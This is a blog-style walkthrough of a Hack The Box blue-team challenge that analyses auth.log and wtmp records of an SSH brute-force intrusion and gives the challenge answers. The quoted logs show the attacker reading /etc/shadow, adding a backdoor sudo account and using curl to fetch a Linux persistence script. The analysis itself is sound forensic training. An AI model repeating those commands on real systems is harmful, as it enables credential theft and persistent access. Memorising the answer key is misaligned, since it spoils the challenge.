In this scenario we get told “you will familiarize yourself with Unix auth.log and wtmp logs”

it mentions:

→a Confluence server was brute-forced via its SSH service

→The attacker performed additional activies in auth.log

we’ll see also privesc, persistence and Command Execution.

 

I will first download the zip file and analyse the readme.

*wget linktothefile*

password : hacktheblue

—> no readme file 

auth.log : we will check which commands been used from the malicious intruder

[utmp.py](http://utmp.py) : *after googling* seems like it helps reading wtmp files. might be HTB helping us there.

`On Linux the wtmp and btmp files are usually located in the /var/log/ directory.`

`The utmp.read function decodes a binary utmp/wtmp stream and yields record objects`

wtmp : https://fr.wikipedia.org/wiki/Wtmp

keep trace of login/out on the system looks like we can cat the file

### auth.log

looking at the file we see theses commands :

```xml
Mar  6 06:19:52 ip-172-31-35-28 sshd[1465]: AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys root SHA256:4vycLsDMzI+hyb9OP3wd18zIpyTqJmRq/QIZaLNrg8A failed, status 22
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:19:54 ip-172-31-35-28 systemd-logind[411]: New session 6 of user root.
Mar  6 06:19:54 ip-172-31-35-28 systemd: pam_unix(systemd-user:session): session opened for user root(uid=0) by (uid=0)
```

after some CRON and some bruteforce

```xml
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
[...]
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
[...]
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
```

Once he created a super user, as this super user

```xml
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: pam_unix(sshd:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
Mar  6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.
Mar  6 06:37:34 ip-172-31-35-28 systemd: pam_unix(systemd-user:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
[...]
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

The intruder finally manage to get access to the system. and create a new user on which it will grant sudo rights. this can be considered as a “backdoor” since even if the password for root is changed. the malautru will be able to gain access till this account won’t be deleted.

### wtmp file

`python [utmp.py](http://utmp.py/) -o wtmpTMP wtmp`

Using the python file to read wtmp file we get this file :

![image.png](attachment:0aed727b-6cb9-47a7-826e-7d19481ab0ec:image.png)

we could print this table in different manner so it appears to us properly.

since many informations are there. we will start to answer questions to understand better how they wanna lead us.

Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

65.2.161.68 

*simply check for login attemps that didn’t go in auth.log.*

The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

root

*“accepted password for root”*

Identify the timestamp when the attacker logged in manually to the server to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

2024/03/06 01:32:45

*cross information with auth.log to get when it could connect manually*

SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

we don’t look for the bot ID connection. but the malicious guy behind it.

![image.png](attachment:8bc7321a-c1b0-42d4-934f-54f04ec1905c:image.png)

37

The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

cyberjunkie

*mentionned above*

What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

Googled : 

—>MITRE att&ck group elevation persistence

4th link : https://attack.mitre.org/techniques/T1548/

ctrl+f “group”

https://attack.mitre.org/mitigations/M1026/

[…]

after some research check for persistence : 

![image.png](attachment:1f13d46b-408f-4cc1-b217-218e759027bb:image.png)

T1136.001

What time did the attacker's first SSH session end according to auth.log?

2024-03-6 06:37:24 (id 37)

2024-03-6 06:31:40 (id 34)

The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh